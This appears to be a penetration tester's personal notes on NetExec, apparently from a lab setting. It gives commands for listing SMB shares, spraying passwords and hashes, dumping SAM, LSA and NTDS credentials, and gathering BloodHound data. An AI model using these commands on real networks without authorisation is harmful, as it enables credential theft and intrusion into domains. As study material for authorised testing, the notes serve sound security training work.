General usage
	Pwn3d! means code exec and RDP possible

List shares
	 `netexec smb 172.16.191.11 -u joe -d medtech.com -p "Flowers1" --shares

Password / Hash spraying example `# TEST DOMAIN AND LOCAL USERS`
```
#Collect creds as you enumerate a network and reuse them

# Spray domain users
nxc smb 172.16.182.13 -u users -H hashes --continue-on-success
nxc smb 172.16.182.13 -u users -p passwords --continue-on-success

# Spray for local users
nxc smb <ip> -U users -P passwords --continue-on-success --local-auth
nxc smb <ip> -U users -H hashes --continue-on-success --local-auth
```

Dumping Creds
	add these on to end of nxc
	--sam
	--lsa
	--ntds
		DCs
```
#domain hashes

nxc smb <ip> -u <user> -p <pass> --ntds

#local hashes

nxc smb <ip> -u <user> -p <pass> --sam
```


Collect Bloodhound data
```
nxc ldap '<dc_hostname.domain>' -d '<domain_name>' -u '<user>' -p '<password>' --bloodhound -c All --dns-server <ip_address (usually of DC)>

# proxychains
proxychains -q nxc ldap DC1.ad.lab -d 'ad.lab' -u 'john.doe' -p 'P@$$word123!' --bloodhound -c All --dns-server 10.80.80.2 --dns-tcp
```